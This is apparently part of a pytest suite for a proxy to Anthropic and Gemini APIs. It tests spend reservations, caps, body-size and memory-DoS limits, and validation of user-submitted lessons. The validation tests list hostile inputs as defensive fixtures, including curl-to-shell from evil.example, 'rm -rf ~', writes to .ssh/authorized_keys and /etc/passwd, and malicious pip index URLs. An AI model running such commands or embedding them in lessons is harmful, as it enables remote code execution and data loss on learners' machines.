    big = {"model": SONNET, "max_tokens": 1, "messages": msg("x" * 1_800_000)}
    clean, uses, tokens = app_mod.sanitize_anthropic(big)
    payload = len(json.dumps(clean).encode())
    reserve = app_mod.anthropic_reserve(clean, payload, uses, tokens)
    assert reserve == pytest.approx(payload // 3 * 2.0 / 1e6 + 10.0 / 1e6)  # ~$1.20, not $0.00001
    assert reserve > 1.0
    # images are held at IMAGE_RESERVE_TOKENS each, not at their base64 size
    img = {"model": HAIKU, "max_tokens": 10, "messages": [{"role": "user", "content": [
        {"type": "image", "source": {"type": "base64", "media_type": "image/png", "data": "A" * 600_000}}]}]}
    clean, uses, tokens = app_mod.sanitize_anthropic(img)
    est = app_mod.input_tokens_estimate(len(json.dumps(clean).encode()), clean)
    assert app_mod.IMAGE_RESERVE_TOKENS <= est < app_mod.IMAGE_RESERVE_TOKENS + 200


def test_web_fetch_always_bounded_and_reserved(make_cloud):
    client, app_mod = make_cloud(ANTHROPIC_SERVER_TOOLS="web_search,web_fetch", SERVER_TOOL_MAX_USES="3")
    up = Upstream(app_mod)
    h, _ = install(client)
    assert app_mod.WEB_FETCH_MAX_CONTENT_TOKENS == 20_000
    for tool, want in (({"type": "web_fetch_20260209", "name": "web_fetch"}, 20_000),
                       ({"type": "web_fetch_20260209", "name": "web_fetch", "max_content_tokens": 500_000}, 20_000),
                       ({"type": "web_fetch_20260209", "name": "web_fetch", "max_content_tokens": 5_000}, 5_000)):
        assert post_anthropic(client, h, {"model": HAIKU, "max_tokens": 10, "messages": msg(), "tools": [tool]}).status_code == 200
        assert up.last["tools"][0]["max_content_tokens"] == want
    clean, uses, tokens = app_mod.sanitize_anthropic({"model": SONNET, "max_tokens": 10, "messages": msg(), "tools": [
        {"type": "web_fetch_20260209", "name": "web_fetch"}, {"type": "web_search_20250305", "name": "web_search"}]})
    assert uses == 6 and tokens == 3 * 20_000 + 3 * app_mod.WEB_SEARCH_RESERVE_TOKENS
    assert app_mod.anthropic_reserve(clean, 100, uses, tokens) > 0.06 + tokens * 2.0 / 1e6 - 1e-9


def test_parallel_large_prompts_cannot_pass_the_caps_by_more_than_one_call(make_cloud):
    """Every call reserves its input too, so a wave of large prompts in flight at once stops at the cap: the real
    spend of everything admitted stays within the cap plus about one call."""
    client, app_mod = make_cloud(DAILY_USD_CAP="2", FREE_DAILY_USD="0")
    tokens = [install(client)[0] for _ in range(8)]
    prompt = "x" * 1_000_000  # ~333k tokens by bytes / 3; the mock bills it at 250k (bytes / 4)
    real = app_mod.estimate_usd(SONNET, 250_000, 1)

    async def scenario():
        gate = asyncio.Event()
        calls = []

        async def handler(request):
            calls.append(request)
            await gate.wait()
            return httpx.Response(200, json={"type": "message", "model": SONNET, "content": [],
                                             "usage": {"input_tokens": 250_000, "output_tokens": 1}})

        app_mod.http = httpx.AsyncClient(transport=httpx.MockTransport(handler))
        body = {"model": SONNET, "max_tokens": 1, "messages": msg(prompt)}
        tasks = [asyncio.create_task(_asgi(app_mod.app, "/v1/anthropic/v1/messages", h, body, asyncio.Event())) for h in tokens]
        for _ in range(300):
            if len(calls) + sum(t.done() for t in tasks) == len(tasks):
                break
            await asyncio.sleep(0.01)
        admitted = len(calls)
        gate.set()
        results = await asyncio.wait_for(asyncio.gather(*tasks), 10)
        await app_mod.http.aclose()
        return admitted, [s for s, _ in results]

    admitted, statuses = asyncio.run(scenario())
    assert 1 <= admitted < len(tokens) and statuses.count(200) == admitted
    assert statuses.count(429) == len(tokens) - admitted
    assert app_mod.store.usd_today() <= 2 + real + 1e-9
    assert admitted * real <= 2 + real

    # the per-install USD cap the same way: one install, calls in parallel
    client, app_mod = make_cloud(FREE_DAILY_USD="1.50")
    h, _ = install(client)
    tokens = [h] * 6

    async def one_install():
        gate = asyncio.Event()
        calls = []

        async def handler(request):
            calls.append(request)
            await gate.wait()
            return httpx.Response(200, json={"type": "message", "model": SONNET, "content": [],
                                             "usage": {"input_tokens": 250_000, "output_tokens": 1}})

        app_mod.http = httpx.AsyncClient(transport=httpx.MockTransport(handler))
        body = {"model": SONNET, "max_tokens": 1, "messages": msg(prompt)}
        tasks = [asyncio.create_task(_asgi(app_mod.app, "/v1/anthropic/v1/messages", t, body, asyncio.Event())) for t in tokens]
        for _ in range(300):
            if len(calls) + sum(t.done() for t in tasks) == len(tasks):
                break
            await asyncio.sleep(0.01)
        admitted = len(calls)
        gate.set()
        await asyncio.wait_for(asyncio.gather(*tasks), 10)
        await app_mod.http.aclose()
        return admitted

    admitted = asyncio.run(one_install())
    assert 1 <= admitted < 6
    assert app_mod.store.usd_today_for(app_mod.hash_token(h["Authorization"][7:])) <= 1.50 + real + 1e-9


def test_gemini_reservation_counts_video_and_thinking(make_cloud):
    _, app_mod = make_cloud()
    price_in, price_out = app_mod.input_price(GEM), app_mod.output_price(GEM)
    # the engine's window: 600 s at 0.5 fps, no thinkingConfig
    window = {"contents": [{"parts": [{"fileData": {"fileUri": YT}, "videoMetadata": {"startOffset": "600s", "endOffset": "1200s",
                                                                                        "fps": 0.5}}, {"text": "watch"}]}]}
    clean, max_out = app_mod.sanitize_gemini(window)
    payload = len(json.dumps(clean).encode())
    video = int(600 * (0.5 * 258 + 32))
    # thinking counts against maxOutputTokens: the clamp alone bounds answer and thinking together
    want = (payload // 3 + video) * price_in + 32768 * price_out
    assert app_mod.gemini_reserve(clean, GEM, payload) == pytest.approx(want)
    assert app_mod.GEMINI_VIDEO_RESERVE_TOKENS == 300_000
    # a whole video (no end offset) is held at GEMINI_VIDEO_RESERVE_TOKENS; LOW resolution frames are cheaper
    whole = {"contents": [{"parts": [{"fileData": {"fileUri": YT}}]}]}
    clean, _ = app_mod.sanitize_gemini(whole)
    assert app_mod.gemini_reserve(clean, GEM, 0) >= 300_000 * price_in
    low = {**window, "generationConfig": {"mediaResolution": "MEDIA_RESOLUTION_LOW"}}
    clean, _ = app_mod.sanitize_gemini(low)
    assert app_mod._video_tokens(clean["contents"][0]["parts"][0], True) == int(600 * (0.5 * 70 + 32))
    # an explicit thinking budget (clamped to 2048) fits inside the output clamp: nothing extra is held
    capped = {**window, "generationConfig": {"thinkingConfig": {"thinkingBudget": 100_000}}}
    clean, _ = app_mod.sanitize_gemini(capped)
    assert clean["generationConfig"]["thinkingConfig"] == {"thinkingBudget": 2048}
    payload = len(json.dumps(clean).encode())
    assert app_mod.gemini_reserve(clean, GEM, payload) == pytest.approx((payload // 3 + video) * price_in + 32768 * price_out)
    # a smaller maxOutputTokens the client asked for is what is held
    small = {**window, "generationConfig": {"maxOutputTokens": 1000}}
    clean, _ = app_mod.sanitize_gemini(small)
    payload = len(json.dumps(clean).encode())
    assert app_mod.gemini_reserve(clean, GEM, payload) == pytest.approx((payload // 3 + video) * price_in + 1000 * price_out)


# --------------------------------------------------------------------------- round 2: settling without the final usage

class GatedStream(httpx.AsyncByteStream):
    """A response body that sends `first` (possibly nothing), then waits for `gate` before `last`."""

    def __init__(self, gate: asyncio.Event, first: bytes = b"", last: bytes = b"") -> None:
        self.gate, self.first, self.last = gate, first, last

    async def __aiter__(self):
        if self.first:
            yield self.first
        await self.gate.wait()
        if self.last:
            yield self.last


SSE = {"content-type": "text/event-stream"}
ANTHROPIC_PATH = "/v1/anthropic/v1/messages"
GEMINI_STREAM_PATH = f"/v1/gemini/v1beta/models/{GEM}:streamGenerateContent"
GEM_FIRST = (b'data: {"candidates":[{"content":{"parts":[{"text":"{\\"a\\":"}],"role":"model"}}],'
             b'"usageMetadata":{"promptTokenCount":2000,"candidatesTokenCount":5},"modelVersion":"gemini-3.8-flash"}\r\n\r\n')
GEM_LAST = (b'data: {"candidates":[{"content":{"parts":[{"text":"1}"}],"role":"model"},"finishReason":"STOP"}],'
            b'"usageMetadata":{"promptTokenCount":2000,"candidatesTokenCount":300},"modelVersion":"gemini-3.8-flash"}\r\n\r\n')


def _reserve_for(app_mod, body: dict) -> float:
    clean, uses, tokens = app_mod.sanitize_anthropic(body)
    return app_mod.anthropic_reserve(clean, len(json.dumps(clean).encode()), uses, tokens)


def test_stream_hangup_before_the_final_usage_keeps_the_reservation(make_cloud):
    """The probe: a fresh anonymous install sends Sonnet, stream, max_tokens 4096 and a 1.2 MB prompt, and hangs up
    before message_start. The provider bills the prefill, so the ~$0.84 reservation is kept (it used to settle to
    $0 and the caps never moved): the second such call is already over FREE_DAILY_USD."""
    client, app_mod = make_cloud(FREE_DAILY_USD="1.00", DAILY_USD_CAP="25")
    h, _ = install(client)
    th = app_mod.hash_token(h["Authorization"][7:])
    body = {"model": SONNET, "max_tokens": 4096, "messages": msg("x" * 1_200_000), "stream": True}
    reserve = _reserve_for(app_mod, body)
    assert 0.8 < reserve < 0.9

    async def scenario():
        gate = asyncio.Event()
        app_mod.http = httpx.AsyncClient(transport=httpx.MockTransport(
            lambda r: httpx.Response(200, stream=GatedStream(gate), headers=SSE)))
        out = []
        for _ in range(5):
            gone = asyncio.Event()
            gone.set()  # the client is already gone
            out.append(await asyncio.wait_for(_asgi(app_mod.app, ANTHROPIC_PATH, h, body, gone), 5))
        gate.set()
        await app_mod.http.aclose()
        return out

    results = asyncio.run(scenario())
    assert app_mod.store.usd_today_for(th) == pytest.approx(reserve)
    assert app_mod.store.usd_today() == pytest.approx(reserve)
    for status, raw in results[1:]:
        assert status == 429 and json.loads(raw)["error"]["limit"] == "daily_spend"
    assert app_mod.inflight.total == 0 and app_mod.inflight.per == {} and app_mod.inflight.bytes_total == 0


def test_gemini_stream_settles_to_the_real_cost_only_after_its_final_chunk(make_cloud):
    client, app_mod = make_cloud(FREE_DAILY_USD="5")
    done_h, _ = install(client)
    gone_h, _ = install(client)
    body = gem_body()
    clean, _ = app_mod.sanitize_gemini(body)
    reserve = app_mod.gemini_reserve(clean, GEM, len(json.dumps(clean).encode()))

    async def scenario():
        gate = asyncio.Event()
        app_mod.http = httpx.AsyncClient(transport=httpx.MockTransport(
            lambda r: httpx.Response(200, stream=GatedStream(gate, GEM_FIRST, GEM_LAST), headers=SSE)))
        hangup = asyncio.Event()
        gone = asyncio.create_task(_asgi(app_mod.app, GEMINI_STREAM_PATH, gone_h, body, hangup))
        await asyncio.sleep(0.05)  # the first chunk (usage, no finishReason) has gone by
        hangup.set()
        await asyncio.wait_for(gone, 5)
        gate.set()  # the next stream runs to its final chunk
        status, raw = await asyncio.wait_for(_asgi(app_mod.app, GEMINI_STREAM_PATH, done_h, body, asyncio.Event()), 5)
        await app_mod.http.aclose()
        return status, raw

    status, raw = asyncio.run(scenario())
    assert status == 200 and b"finishReason" in raw
    assert app_mod.store.usd_today_for(app_mod.hash_token(done_h["Authorization"][7:])) == pytest.approx(
        app_mod.estimate_usd(GEM, 2000, 300))
    assert app_mod.store.usd_today_for(app_mod.hash_token(gone_h["Authorization"][7:])) == pytest.approx(reserve)


def test_upstream_errors_and_unreachable_upstreams_are_not_held(make_cloud):
    """A provider refusal (non-200) or a provider never reached is not billed: those reservations are dropped."""
    client, app_mod = make_cloud()
    h, _ = install(client)
    th = app_mod.hash_token(h["Authorization"][7:])
    assert anthropic(client, h).status_code == 502  # the closed port: never connected
    Upstream(app_mod, status=529, body={"type": "error", "error": {"type": "overloaded_error", "message": "busy"}})
    assert post_anthropic(client, h, {"model": HAIKU, "max_tokens": 10, "messages": msg()}).status_code == 529
    assert app_mod.store.usd_today_for(th) == 0


def test_terminal_events_cannot_be_faked_by_model_text(make_cloud):
    _, app_mod = make_cloud()
    u = app_mod.Usage("anthropic")
    u.sse = True
    # the model wrote the words of a terminal event: inside a JSON string they are escaped, so they never parse as one
    u.feed(b'event: content_block_delta\ndata: {"type":"content_block_delta","delta":{"type":"text_delta",'
           b'"text":"{\\"type\\":\\"message_stop\\"}"}}\n\n')
    assert not u.complete
    u.feed(b'event: message_delta\ndata: {"type":"message_de')  # split across chunks
    assert not u.complete
    u.feed(b'lta","usage":{"output_tokens":20}}\n\n')
    assert u.complete and u.fields["output_tokens"] == 20
    g = app_mod.Usage("gemini")
    g.sse = True
    g.feed(GEM_FIRST)
    assert not g.complete
    g.feed(b'data: {"candidates":[{"finishReason":"STOP"}]}\r\n\r\n')  # a finishReason without its usage
    assert not g.complete
    g.feed(GEM_LAST)
    assert g.complete
    # a whole non-stream body is complete only with its usage object
    n = app_mod.Usage("anthropic")
    n.feed_body(b'{"type":"message","content":[]}')
    assert not n.complete
    n.feed_body(json.dumps(ANTHROPIC_OK).encode())
    assert n.complete
    # a non-SSE stream (Gemini's JSON array) that ended cleanly, with usage seen
    a = app_mod.Usage("gemini")
    a.feed(b'[{"usageMetadata": {"promptTokenCount": 5}}]')
    a.end_of_stream()
    assert a.complete


# --------------------------------------------------------------------------- round 2: one-request memory DoS

def test_a_body_of_empty_objects_is_refused_while_parsing(make_cloud):
    """The probe: an 8 MB {"contents":[{},{},...]} took RSS from ~100 MB to 1.3 GB before admit() refused it. The
    body limit is now 2 MB and parsing stops at JSON_MAX_OBJECTS, before anything is copied."""
    client, app_mod = make_cloud()
    up = Upstream(app_mod)
    h, _ = install(client)
    th = app_mod.hash_token(h["Authorization"][7:])
    n = (app_mod.MAX_GEMINI_BODY - 100) // 3
    raw = b'{"contents":[' + b",".join([b"{}"] * n) + b"]}"
    assert len(raw) <= app_mod.MAX_GEMINI_BODY and n > 10 * app_mod.JSON_MAX_OBJECTS
    tracemalloc.start()
    try:
        r = client.post(f"/v1/gemini/v1beta/models/{GEM}:generateContent", headers={**h, "content-type": "application/json"},
                        content=raw)
        _, peak = tracemalloc.get_traced_memory()
    finally:
        tracemalloc.stop()
    assert r.status_code == 400 and "JSON objects" in r.json()["error"]["message"]
    assert peak < 32 * 1024 * 1024, peak  # ~700k dicts would be 50 MB and more before any copy
    assert up.requests == [] and app_mod.store.requests_today(th) == 0
    assert app_mod.inflight.bytes_total == 0 and app_mod.inflight.per == {}
    # the old 8 MB body is refused on its Content-Length, unread
    big = client.post(f"/v1/gemini/{GEM}:generateContent", headers={**h, "content-length": str(8 * 1024 * 1024)},
                      content=b"{}")
    assert big.status_code == 413


@pytest.mark.parametrize("route, body, needle", [
    ("gemini", {"contents": [[] for _ in range(501)]}, "contents"),
    ("gemini", {"contents": [{"parts": [{"text": "x"}] * 1001}] * 2}, "parts"),
    ("gemini", {"contents": [], "systemInstruction": {"parts": [{"text": "x"}] * 2001}}, "parts"),
    ("gemini", {"contents": [], "tools": [{"functionDeclarations": [{"name": "f"}] * 257}]}, "functionDeclarations"),
    ("gemini", {"contents": [], "safetySettings": [{}] * 33}, "safetySettings"),
    ("anthropic", {"model": HAIKU, "max_tokens": 10, "messages": [{"role": "user", "content": "hi"}] * 1001}, "messages"),
    ("anthropic", {"model": HAIKU, "max_tokens": 10, "messages": [{"role": "user", "content": [{"type": "text", "text": "x"}] * 2001}] * 2},
     "content blocks"),
])
def test_structure_is_bounded_before_it_is_copied(make_cloud, route, body, needle):
    client, app_mod = make_cloud()
    up = Upstream(app_mod)
    h, _ = install(client)
    r = post_gemini(client, h, body) if route == "gemini" else post_anthropic(client, h, body)
    assert r.status_code == 400 and needle in r.json()["error"]["message"], r.text
    assert up.requests == []


def test_ai_routes_need_a_content_length(make_cloud):
    client, app_mod = make_cloud()
    up = Upstream(app_mod)
    h, _ = install(client)

    def chunked():
        yield json.dumps({"model": HAIKU, "max_tokens": 10, "messages": msg()}).encode()

    for path in (ANTHROPIC_PATH, f"/v1/gemini/{GEM}:generateContent"):
        r = client.post(path, headers={**h, "content-type": "application/json"}, content=chunked())
        assert r.status_code == 411 and r.json()["error"]["type"] == "length_required"
    assert up.requests == [] and app_mod.inflight.per == {}


def test_buffered_body_bytes_are_bounded_in_total_and_per_network(make_cloud):
    """Dripped bodies used to be bounded only by tokens x PER_TOKEN_INFLIGHT (and minting gives 60 tokens per IPv4
    a day). Their declared bytes now count against MAX_INFLIGHT_BODY in total and MAX_INFLIGHT_BODY_PER_IP per
    network from before the body is read until the call ends."""
    client, app_mod = make_cloud(MAX_INFLIGHT_BODY_MB=str(250_000 / 1048576), MAX_INFLIGHT_BODY_PER_IP_MB="0")
    assert app_mod.MAX_INFLIGHT_BODY == 250_000
    slow = [install(client)[0] for _ in range(3)]

    async def total():
        release = asyncio.Event()
        starts = [asyncio.Event() for _ in slow]
        held = [asyncio.create_task(_asgi_slow(app_mod.app, ANTHROPIC_PATH, h, starts[i], release)) for i, h in enumerate(slow[:2])]
        await asyncio.wait_for(asyncio.gather(*(s.wait() for s in starts[:2])), 5)
        assert app_mod.inflight.bytes_total == 200_000
        status = await asyncio.wait_for(_asgi_slow(app_mod.app, ANTHROPIC_PATH, slow[2], starts[2], release), 5)
        release.set()
        await asyncio.wait_for(asyncio.gather(*held), 5)
        return status, starts[2].is_set()

    status, read = asyncio.run(total())
    assert status == 429 and not read  # refused before its body was read
    assert app_mod.inflight.bytes_total == 0 and app_mod.inflight.bytes_per_net == {} and app_mod.inflight.per == {}

    client, app_mod = make_cloud(MAX_INFLIGHT_BODY_MB="0", MAX_INFLIGHT_BODY_PER_IP_MB=str(150_000 / 1048576))
    a, b, c = (install(client)[0] for _ in range(3))

    async def per_network():
        release = asyncio.Event()
        s = [asyncio.Event() for _ in range(3)]
        first = asyncio.create_task(_asgi_slow(app_mod.app, ANTHROPIC_PATH, {**a, "X-Forwarded-For": "198.51.100.7"}, s[0], release))
        await asyncio.wait_for(s[0].wait(), 5)
        same = await asyncio.wait_for(_asgi_slow(app_mod.app, ANTHROPIC_PATH, {**b, "X-Forwarded-For": "198.51.100.7"}, s[1], release), 5)
        other = asyncio.create_task(_asgi_slow(app_mod.app, ANTHROPIC_PATH, {**c, "X-Forwarded-For": "203.0.113.9"}, s[2], release))
        await asyncio.wait_for(s[2].wait(), 5)  # another network still gets in
        release.set()
        await asyncio.wait_for(asyncio.gather(first, other), 5)
        return same

    assert asyncio.run(per_network()) == 429
    assert app_mod.inflight.bytes_total == 0 and app_mod.inflight.bytes_per_net == {}


def test_buffered_body_limit_errors_are_concurrency_errors(make_cloud):
    _, app_mod = make_cloud()
    for which, limit in (("bytes", "inflight_bytes"), ("bytes_net", "inflight_bytes_network")):
        r = app_mod.too_many_inflight(which)
        err = json.loads(r.body)["error"]
        assert r.status_code == 429 and err["type"] == "concurrency_limit_error" and err["limit"] == limit
        assert r.headers["retry-after"] == "1"
    assert app_mod.MAX_INFLIGHT_BODY == 64 * 1024 * 1024 and app_mod.MAX_INFLIGHT_BODY_PER_IP == 16 * 1024 * 1024


def test_small_body_routes_refuse_big_bodies(make_cloud):
    client, app_mod = make_cloud()
    h, _ = install(client)
    r = client.post("/admin", content=b"admin_token=" + b"a" * 5000, headers={"content-type": "application/x-www-form-urlencoded"})
    assert r.status_code == 413
    r = client.post("/v1/link", headers=h, json={"access_token": "x" * 20_000})
    assert r.status_code == 413


# --------------------------------------------------------------------------- round 2: the answering model's price

def test_opus_or_unknown_answering_model_is_never_priced_lower(make_cloud):
    _, app_mod = make_cloud()

    class R:
        state = type("S", (), {})()

    def priced(answer: str, requested: str, provider: str = "anthropic") -> tuple[str, float]:
        u = app_mod.Usage(provider)
        if provider == "anthropic":
            u.feed(json.dumps({"model": answer, "usage": {"input_tokens": 1_000_000, "output_tokens": 0}}).encode())
        else:
            u.feed(json.dumps({"modelVersion": answer, "usageMetadata": {"promptTokenCount": 1_000_000}}).encode())
        model, _, _, usd = u.totals(R(), provider, requested)
        return model, usd

    default_in = app_mod.DEFAULT_PRICE[0]
    assert priced("claude-opus-5", HAIKU) == ("claude-opus-5", pytest.approx(default_in))
    app_mod.PRICES["claude-opus-5"] = (15.0, 75.0)
    try:
        assert priced("claude-opus-5", SONNET)[1] == pytest.approx(15.0)  # its own, higher price
        app_mod.PRICES["claude-opus-cheap"] = (0.01, 0.01)
        assert priced("claude-opus-cheap", SONNET)[1] == pytest.approx(max(default_in, app_mod.PRICES[SONNET][0]))
    finally:
        app_mod.PRICES.pop("claude-opus-5", None)
        app_mod.PRICES.pop("claude-opus-cheap", None)
    assert priced("claude-mystery-9", HAIKU)[1] == pytest.approx(default_in)  # unknown: never Haiku's price
    assert priced(HAIKU, SONNET) == (HAIKU, pytest.approx(app_mod.PRICES[HAIKU][0]))  # a known cheaper fallback
    assert priced(SONNET + "-20261001", SONNET) == (SONNET, pytest.approx(app_mod.PRICES[SONNET][0]))  # a dated id
    assert priced(GEM + "-001", GEM, "gemini") == (GEM, pytest.approx(app_mod.PRICES[GEM][0]))
    assert priced("gemini-9-ultra", GEM, "gemini")[1] == pytest.approx(default_in)


# --------------------------------------------------------------------------- A08: lesson cache

VID = "dQw4w9WgXcQ"


def lesson_client(make_cloud, **env):
    client, app_mod = make_cloud(**{"MAX_LESSON_KB": "4", **env})
    return client, app_mod


def put(client, h, lesson, vid=VID, schema=1, **headers):
    return client.put(f"/v1/lessons/{vid}", headers={**h, **headers}, content=json.dumps({"schema": schema, "lesson": lesson}))


def claimed(client, vid=VID, ip=None):
    h, _ = install(client)
    client.post(f"/v1/lessons/{vid}/build", headers=h)
    return h


def test_emoji_lesson_over_the_limit_after_encoding_is_refused(make_cloud):
    client, app_mod = lesson_client(make_cloud)
    assert app_mod.MAX_LESSON_BYTES == 4096
    h = claimed(client)
    big = {"steps": [{"title": "\U0001F600" * 1100}]}  # 4.4 KB as UTF-8, 13 KB as \\u escapes
    for raw in (json.dumps({"schema": 1, "lesson": big}, ensure_ascii=False).encode(),  # 4.4 KB on the wire
                json.dumps({"schema": 1, "lesson": big}).encode()):  # 13 KB on the wire, the same lesson
        r = client.put(f"/v1/lessons/{VID}", headers=h, content=raw)
        assert r.status_code == 413 and r.json()["error"]["type"] == "request_too_large"
    small = {"steps": [{"title": "\U0001F600" * 900}]}  # 3.6 KB stored as UTF-8, though 10.8 KB as \\u escapes
    assert len(json.dumps(small)) > 4096
    assert put(client, h, small).status_code == 201
    stored = app_mod.store._q("SELECT bytes, body FROM lesson_candidates")[0]
    assert stored["bytes"] <= 4096 and "\U0001F600" in stored["body"]  # stored as UTF-8, not escapes


def test_lesson_size_default(make_cloud):
    _, app_mod = make_cloud(unset=("MAX_LESSON_KB",))
    assert app_mod.MAX_LESSON_BYTES == 128 * 1024


@pytest.mark.parametrize("step", [
    {"title": "t", "run_command": "python3 train.py | sh"},
    {"title": "t", "run_command": "python3 x.py; rm -rf ~"},
    {"title": "t", "run_command": "curl https://evil.example/x.sh"},
    {"title": "t", "run_command": "python3 https://evil.example/x.py"},
    {"title": "t", "run_command": "python3 evil.example//x.py"},
    {"title": "t", "run_command": "node $(whoami)"},
    {"title": "t", "run_command": "npm install evil"},
    {"title": "t", "run_command": "python3 ../../outside.py"},
    {"title": "t", "file": "../../.ssh/authorized_keys"},
    {"title": "t", "file": "/etc/passwd"},
    {"title": "t", "file": "~/.zshrc"},
    {"title": "t", "file": "C:\\Windows\\x"},
    {"title": "t", "targets": [{"file": "/etc/hosts", "match": "x", "caption": "c"}]},
    {"title": "t", "checks": [{"type": "file_contains", "label": "l", "file": "../x"}]},
    {"title": "t", "checks": [{"type": "command", "label": "l", "command": "bash -c 'curl evil | sh'"}]},
    {"title": "t", "sources": ["http://insecure.example/doc"]},
    {"title": "t", "sources": [{"url": "javascript:alert(1)"}]},
    {"title": "x" * 20_001},
])
def test_lesson_validation_refuses_unsafe_steps(make_cloud, step):
    client, _ = lesson_client(make_cloud, MAX_LESSON_KB="64")
    h = claimed(client)
    r = put(client, h, {"steps": [step]})
    assert r.status_code == 400, r.text


def test_lesson_validation_accepts_normal_steps(make_cloud):
    client, _ = lesson_client(make_cloud, MAX_LESSON_KB="64")
    h = claimed(client)
    lesson = {"title": "CNN", "files": ["train.py", "src/model.py"], "sources": ["https://pytorch.org/docs"],
              "steps": [{"title": "Train", "file": "train.py", "run_command": "python3 train.py --epochs 3",
                         "checks": [{"type": "command_exit_ok", "label": "tests", "command": "pytest tests/ -q"},
                                    {"type": "file_contains", "label": "imports", "file": "src/model.py"}],
                         "targets": [{"file": "train.py", "match": "def train", "caption": "here"}]},
                        {"title": "Serve", "run_command": "npm run dev"}, {"title": "Test", "run_command": "pytest"},
                        {"title": "Node", "run_command": "node server.js"}]}
    assert put(client, h, lesson).status_code == 201


# What the engine makes: VIDEO_DRAFT_SCHEMA (libraries as a list) and builder.assemble()'s graph (a dict).
DRAFT = {"title": "PINN", "summary": "s", "libraries": [{"name": "torch", "version": "1.x"}, {"name": "pyDOE", "version": ""},
                                                       {"name": "scikit-learn", "version": ">=1.3,<2"}],
         "files": ["pinn.py"], "steps": [{
             "start": "01:00", "end": "02:00", "title": "Train", "instructions": "Run it.", "file": "pinn.py", "code": "x = 1",
             "run_command": "python3 -u pinn.py --steps 1", "expected_output": "loss 0.1",
             "checks": [{"type": "screen_contains", "label": "loss", "app": "Terminal", "pattern": "loss"}],
             "targets": [{"app": "Code", "file": "pinn.py", "match": "x = 1", "caption": "c"}],
             "explanations": [{"topic": "loss", "t": "01:30"}], "hints": ["h"], "common_mistakes": ["m"]}]}
GRAPH = {"lesson": {"id": "", "title": "React", "goal": "g", "libraries": {"react": "18.x", "vite": "4.x", "@types/node": "20.x"}},
         "sources": [], "steps": [{
             "id": "s1", "index": 1, "title": "Start", "instructions": "i", "video": {"sourceId": "src1", "start": "00:10", "end": "00:20"},
             "checks": [{"id": "s1c1", "type": "screen_contains", "label": "l", "pattern": "Vite"}],
             "precision_checks": [{"id": "s1p1", "type": "command_exit_ok", "label": "runs", "command": "python -m pytest -q"}],
             "targets": [], "explanations": [{"topic": "t", "t": "00:12", "sourceId": "src1"}], "hints": [], "common_mistakes": [],
             "run_command": "Run the cell (Shift+Enter)", "setup": True, "requires": ["node", "vscode"], "sample_output": "ok",
             "solution": "s"}]}


def test_lesson_validation_accepts_what_the_engine_makes(make_cloud):
    client, app_mod = lesson_client(make_cloud, MAX_LESSON_KB="64")
    for lesson in (DRAFT, GRAPH):
        assert app_mod.validate_lesson(lesson) is None, lesson
    h = claimed(client)
    assert put(client, h, DRAFT).status_code == 201


@pytest.mark.parametrize("patch, needle", [
    ({"libraries": [{"name": "git+https://evil.example/x.git", "version": ""}]}, "libraries"),
    ({"libraries": [{"name": "torch", "version": "https://evil.example/torch.whl"}]}, "libraries"),
    ({"libraries": [{"name": "./evil", "version": ""}]}, "libraries"),
    ({"libraries": [{"name": "torch", "version": "1.0 --index-url=x"}]}, "libraries"),
    ({"libraries": [{"name": "--extra-index-url", "version": ""}]}, "libraries"),
    ({"libraries": [{"name": "torch", "version": "1", "url": "x"}]}, "libraries"),
    ({"lesson": {"libraries": {"evil @ file:///tmp/x": ""}}}, "libraries"),
    ({"lesson": {"workdir": "/tmp"}}, "lesson.lesson"),
    ({"precision": []}, "unknown lesson key"),
    ({"steps": [{"title": "t", "precision_checks": [{"type": "command_exit_ok", "label": "l",
                                                      "command": "python -m pip install evil"}]}]}, "check commands"),
    ({"steps": [{"title": "t", "precision_checks": [{"type": "shell", "label": "l"}]}]}, "check type"),
    ({"steps": [{"title": "t", "checks": [{"type": "command_exit_ok", "label": "l", "command": "node x.js", "cwd": "/"}]}]}, "check key"),
    ({"steps": [{"title": "t", "workdir": "/tmp"}]}, "unknown step key"),
    ({"steps": [{"title": "t", "targets": [{"match": "m", "caption": "c", "command": "x"}]}]}, "targets"),
    ({"steps": [{"title": "t", "requires": ["node; rm -rf ~"]}]}, "requires"),
])
def test_lesson_validation_refuses_what_could_run_on_learners_macs(make_cloud, patch, needle):
    _, app_mod = lesson_client(make_cloud)
    lesson = {**DRAFT, **patch}
    why = app_mod.validate_lesson(lesson)
    assert why and needle in why, why


@pytest.mark.parametrize("cmd", ["python -m pip install requests", "python3 -m http.server 8000", "python -c print",
                                 "node -e process.exit", "node --require ./x.js app.js", "node --import x app.js",
                                 "npx create-react-app x", "npm run -s dev", "pytest -p evil", "python -m pytest -p evil",
                                 "pytest -c other.ini", "python -m ensurepip", "python -m webbrowser x", "python -m",
                                 "python", "python -u", "node --inspect app.js", "python3 -m site"])
def test_run_commands_that_run_or_install_code_are_refused(make_cloud, cmd):
    _, app_mod = lesson_client(make_cloud)
    assert app_mod._ok_command(cmd) is False
    assert "step 1" in app_mod.validate_lesson({"steps": [{"title": "t", "run_command": cmd}]})


@pytest.mark.parametrize("cmd", ["python3 train.py --epochs 3", "python -u train.py", "python3 -m venv venv", "python -m pytest -q",
                                 "python -m unittest", "python -m flask run", "python -m streamlit run app.py", "pytest tests/ -q",
                                 "pytest", "node server.js", "node server.js -e x", "npm run dev", "Run the cell (Shift+Enter)"])
def test_plain_run_commands_still_pass(make_cloud, cmd):
    _, app_mod = lesson_client(make_cloud)
    assert app_mod._ok_command(cmd) is True


def test_pending_view_shows_libraries_and_commands(make_cloud):
    client, _ = lesson_client(make_cloud, MAX_LESSON_KB="64")
    h = claimed(client)
    assert put(client, h, DRAFT).status_code == 201
    pending = client.get("/admin/lessons/pending", headers=ADMIN).json()["pending"]
    assert len(pending) == 1
    p = pending[0]
    assert p["libraries"] == ["torch 1.x", "pyDOE", "scikit-learn >=1.3,<2"]
    assert p["commands"] == ["python3 -u pinn.py --steps 1"] and p["files"] == ["pinn.py"]
    assert "body" not in p


def test_operator_can_read_a_candidates_whole_body_before_approving(make_cloud):
    """The pending view shows libraries, commands and files only; instructions, code, solutions and hints are what
    every later learner receives (instructions could say "paste curl ... | sh"), so the whole body is readable."""
    client, app_mod = lesson_client(make_cloud, MAX_LESSON_KB="64")
    h = claimed(client)
    lesson = {"steps": [{"title": "Set up", "instructions": "Open a terminal and paste the command below.",
                         "code": "print('hi')", "solution": "print('hi')", "hints": ["look at line 1"]}]}
    r = put(client, h, lesson)
    digest = r.json()["hash"]
    p = client.get("/admin/lessons/pending", headers=ADMIN).json()["pending"][0]
    assert p["full"] == f"/admin/lessons/{VID}/candidates/{digest}"
